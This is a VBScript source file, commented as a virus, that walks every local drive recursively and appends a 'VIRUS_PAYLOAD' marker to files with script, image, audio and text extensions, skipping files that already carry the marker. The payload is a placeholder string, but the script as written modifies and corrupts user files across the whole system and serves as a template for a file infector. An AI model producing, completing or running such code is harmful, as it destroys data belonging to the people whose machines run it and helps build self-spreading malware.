Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the list of file extensions to infect
extensions = Array("VBS", "VBE", "JS", "JSE", "CSS", "WSH", "SCT", "HTA", "JPG", "JPEG", "MP3", "MP2", "TXT")

' Get the list of drives on the system
Set drives = objFSO.Drives

' Iterate through each drive
For Each drive In drives
    ' Check if the drive is ready and not a network drive
    If drive.IsReady And Not drive.DriveType = 4 Then
        ' Get the root folder of the drive
        Set folder = objFSO.GetFolder(drive.RootFolder)

        ' Recursively infect files in the folder and its subfolders
        InfectFiles folder
    End If
Next

' Function to infect files in a folder and its subfolders
Sub InfectFiles(folder)
    ' Iterate through each file in the folder
    For Each file In folder.Files
        ' Check if the file has a matching extension
        If HasMatchingExtension(file) Then
            ' Open the file for reading
            Set objFile = objFSO.OpenTextFile(file.Path)

            ' Read the content of the file
            content = objFile.ReadAll

            ' Close the file
            objFile.Close

            ' Check if the file is not already infected
            If InStr(content, "VIRUS_PAYLOAD") = 0 Then
                ' Append the virus payload to the file content
                infectedContent = content & vbCrLf & "VIRUS_PAYLOAD"

                ' Open the file for writing
                Set objFile = objFSO.OpenTextFile(file.Path, 2)

                ' Write the infected content to the file
                objFile.Write infectedContent

                ' Close the file
                objFile.Close
            End If
        End If
    Next

    ' Recursively infect files in subfolders
    For Each subfolder In folder.Subfolders
        InfectFiles subfolder
    Next
End Sub

' Function to check if a file has a matching extension
Function HasMatchingExtension(file)
    ext = objFSO.GetExtensionName(file.Path)
    
    For Each extension In extensions
        If LCase(ext) = LCase(extension) Then
            HasMatchingExtension = True
            Exit Function
        End If
    Next
    
    HasMatchingExtension = False
End Function
